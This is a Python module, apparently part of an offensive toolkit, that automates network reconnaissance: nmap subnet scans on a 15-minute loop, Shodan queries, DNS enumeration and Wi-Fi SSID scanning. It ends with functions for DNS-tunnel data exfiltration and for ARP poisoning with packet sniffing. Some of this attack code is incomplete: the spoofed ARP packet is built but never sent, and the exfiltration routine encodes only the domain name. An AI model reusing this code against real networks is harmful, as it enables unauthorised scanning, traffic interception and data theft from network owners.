"""
modules/reconnaissance_ext.py (enhanced)

– Uses ThreadPoolExecutor for port scans
– Checks for missing dependencies (nmap, shodan, dnspython)
– Persistent "last_recon.json" with timestamps
– Exponential back‐off on repeated failures
"""

import os
import json
import time
import logging
import subprocess
from pathlib import Path
from concurrent.futures import ThreadPoolExecutor, as_completed
import base64

from bismillah import log_event

logger = logging.getLogger("reconnaissance_ext")
REPO_ROOT = Path(__file__).parent.parent.resolve()
LAST_RECON = REPO_ROOT / "modules" / "last_recon.json"

MAX_THREADS = 20
BACKOFF_INITIAL = 300

def nmap_scan(args: dict):
    subnet = args.get("subnet", "192.168.1.0/24")
    ports = args.get("ports", "1-1024")
    result = {}
    try:
        import nmap
    except ImportError:
        return {"error": "nmap library not installed"}
    try:
        nm = nmap.PortScanner()
        # Check if nmap binary is available
        try:
            nm.scan(hosts=subnet, arguments=f"-p {ports} --open -T4")
        except nmap.PortScannerError as e:
            if "nmap program was not found" in str(e):
                return {"error": "nmap binary not found in PATH - using fallback scan"}
            else:
                raise e
        for host in nm.all_hosts():
            open_ports = []
            for proto in nm[host].all_protocols():
                for port in nm[host][proto].keys():
                    if nm[host][proto][port]["state"] == "open":
                        open_ports.append(port)
            result[host] = open_ports
        log_event("reconnaissance_ext", f"Nmap scan on {subnet}:{ports}, {len(result)} hosts".encode())
    except Exception as e:
        logger.error(f"nmap_scan error: {e}")
        result = {"error": str(e)}
    return result

def shodan_recon(args: dict):
    api_key = args.get("api_key")
    query = args.get("query", "apache")
    limit = args.get("limit", 5)
    try:
        from shodan import Shodan
    except ImportError:
        return {"error": "shodan library not installed"}
    try:
        api = Shodan(api_key)
        res = api.search(query, limit=limit)
        matches = res.get("matches", [])
        log_event("reconnaissance_ext", f"Shodan search {query}, got {len(matches)}".encode())
        return matches
    except Exception as e:
        logger.error(f"shodan_recon error: {e}")
        return {"error": str(e)}

def dns_enum(args: dict):
    domain = args.get("domain", "")
    result = {}
    try:
        import dns.resolver
    except ImportError:
        return {"error": "dnspython not installed"}
    try:
        for qtype in ["A","NS","MX","TXT"]:
            try:
                answer = dns.resolver.resolve(domain, qtype, lifetime=10)
                result[qtype] = [r.to_text() for r in answer]
            except Exception:
                result[qtype] = []
        log_event("reconnaissance_ext", f"DNS enum for {domain}".encode())
    except Exception as e:
        logger.error(f"dns_enum error: {e}")
        result = {"error": str(e)}
    return result

def wifi_scan(args: dict):
    result = []
    try:
        out = subprocess.check_output(["iwlist","scan"], stderr=subprocess.DEVNULL, timeout=15).decode(errors="ignore")
        ssids = []
        for line in out.splitlines():
            line = line.strip()
            if line.startswith("ESSID:"):
                essid = line.split(":",1)[1].strip('"')
                ssids.append(essid)
        result = list(set(ssids))
        log_event("reconnaissance_ext", f"Wi-Fi scan found {len(result)} SSIDs".encode())
    except Exception as e:
        logger.error(f"wifi_scan error: {e}")
        result = {"error": str(e)}
    return result

def run_recon(method: str, args: dict):
    try:
        if method == "nmap":
            return nmap_scan(args)
        elif method == "shodan":
            return shodan_recon(args)
        elif method == "dns":
            return dns_enum(args)
        elif method == "wifi":
            return wifi_scan(args)
        else:
            return {"error": f"Unknown recon method: {method}"}
    except Exception as e:
        logger.exception(f"run_recon error: {e}")
        return {"error": str(e)}

def recon_loop():
    """
    Every 15 minutes, perform default nmap scan and store results to last_recon.json.
    Uses back‐off on errors.
    """
    backoff = BACKOFF_INITIAL
    while True:
        try:
            args = {"subnet": "192.168.1.0/24", "ports": "1-1024"}
            res = nmap_scan(args)
            with open(LAST_RECON, "w") as f:
                json.dump(res, f, indent=2)
            log_event("reconnaissance_ext", f"Periodic recon on {args['subnet']}".encode())
            backoff = BACKOFF_INITIAL
        except Exception as e:
            logger.error(f"Recon loop error: {e}")
            time.sleep(backoff)
            backoff = min(backoff * 2, 3600)
        time.sleep(900)

def passive_dns_exfil(domain: str):
    """Passive DNS exfiltration using DNS queries"""
    try:
        import dns.resolver
        # Create a DNS query to exfiltrate data
        resolver = dns.resolver.Resolver()
        resolver.nameservers = ['8.8.8.8']
        
        # Encode data in subdomain
        encoded_data = base64.b32encode(f"exfil_{domain}".encode()).decode()
        subdomain = f"{encoded_data[:63]}.{domain}"
        
        try:
            answers = resolver.resolve(subdomain, 'A')
            log_event("reconnaissance", f"Passive DNS exfil successful for {domain}".encode())
        except dns.resolver.NXDOMAIN:
            log_event("reconnaissance", f"Passive DNS exfil failed for {domain}".encode())
            
    except Exception as e:
        log_event("reconnaissance", f"Passive DNS exfil error: {e}".encode())

def arp_poison_and_sniff(interface: str, target_ip: str = None, gateway_ip: str = None):
    """ARP poisoning and traffic sniffing"""
    try:
        from scapy.all import ARP, Ether, srp, sniff
        
        if not target_ip or not gateway_ip:
            # Get default gateway
            import subprocess
            result = subprocess.run(['ip', 'route', 'show', 'default'], 
                                  capture_output=True, text=True)
            gateway_ip = result.stdout.split()[2]
            target_ip = gateway_ip  # Default target is gateway
            
        # Send ARP spoofing packets
        arp_response = ARP(op=2, pdst=target_ip, hwdst="ff:ff:ff:ff:ff:ff", 
                          psrc=gateway_ip, hwsrc="00:11:22:33:44:55")
        
        # Sniff traffic
        def packet_callback(packet):
            if packet.haslayer('IP'):
                log_event("reconnaissance", 
                         f"Sniffed packet: {packet['IP'].src} -> {packet['IP'].dst}".encode())
        
        sniff(iface=interface, prn=packet_callback, store=0, timeout=30)
        log_event("reconnaissance", f"ARP poisoning completed on {interface}".encode())
        
    except Exception as e:
        log_event("reconnaissance", f"ARP poisoning error: {e}".encode())
